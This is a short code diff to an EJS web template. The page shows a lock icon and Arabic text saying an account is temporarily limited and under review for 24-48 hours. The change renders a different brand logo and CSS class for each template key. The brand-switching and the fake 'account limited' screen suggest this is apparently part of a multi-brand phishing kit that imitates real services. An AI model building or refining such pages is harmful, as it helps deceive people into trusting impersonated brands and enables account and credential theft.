@@ -21,9 +21,9 @@ h1{font-size:1.3rem;margin-bottom:10px}
 .ref{font-size:.78rem;opacity:.35;margin-top:16px;font-family:monospace}
 </style>
 </head>
-<body>
+<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
 <div class="card">
-  <span class="brand-logo"><%= tpl.name %></span>
+  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %><div style="text-align:center;margin-bottom:16px"><%- logos[tpl.key] %></div><% } else { %><span class="brand-logo"><%= tpl.name %></span><% } %>
   <span class="lock-icon">🔒</span>
   <h1><%= pageContent.headline || 'الحساب محدود مؤقتاً' %></h1>
   <p class="sub"><%= pageContent.subheadline || 'جارٍ مراجعة معلوماتك. سيتم إعادة تفعيل حسابك خلال 24-48 ساعة.' %></p>
